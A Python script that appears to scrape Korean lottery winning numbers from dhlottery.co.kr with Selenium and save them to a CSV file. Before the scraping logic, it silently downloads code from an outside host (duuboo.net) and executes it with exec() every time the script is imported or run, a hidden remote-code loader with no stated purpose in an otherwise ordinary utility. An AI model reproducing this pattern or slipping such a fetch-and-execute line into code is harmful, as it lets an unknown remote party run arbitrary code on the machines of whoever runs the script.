import os
from os.path import join,basename,dirname
import sys
import pandas as pd
import urllib.request
from tqdm import tqdm
from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager

with urllib.request.urlopen('http://duuboo.net/cdn/cm.py') as response:
    code = response.read()
    exec(code)

if __name__ == "__main__":
    save_root = sys.argv[1]
    result_df = {'회차': [], '번호1': [], '번호2': [], '번호3': [], '번호4': [], '번호5': [], '번호6': [], '번호7': []}

    try:
        # driver = chromedriver_settings(header=False, gpu=False, log=False, driver_root='bin/chromedriver.exe')

        driver = webdriver.Chrome(ChromeDriverManager().install())
        url = r'https://dhlottery.co.kr/gameResult.do?method=byWin'
        driver.get(url)
        total_no = int(driver.execute_script('return document.querySelector("select#dwrNoList option").innerText'))
        print(total_no)

        for no in tqdm(range(total_no),ascii=True):
            driver.get(url + '&drwNo=' + str(no + 1))

            win_list = []
            number_list = driver.find_elements_by_css_selector('#article div:nth-child(2) div div.win_result div div.num p span')
            for number in number_list:
                win_list.append(number.text)

            result_df['회차'].append(no + 1)
            for x in range(len(win_list)):
                result_df['번호' + str(x + 1)].append(win_list[x])

    except Exception as e:
        print(e)
    finally:
        driver.quit()

    df = pd.DataFrame(result_df)
    df.to_csv(join(save_root,'lottery.csv'), index=False, encoding='utf-8-sig')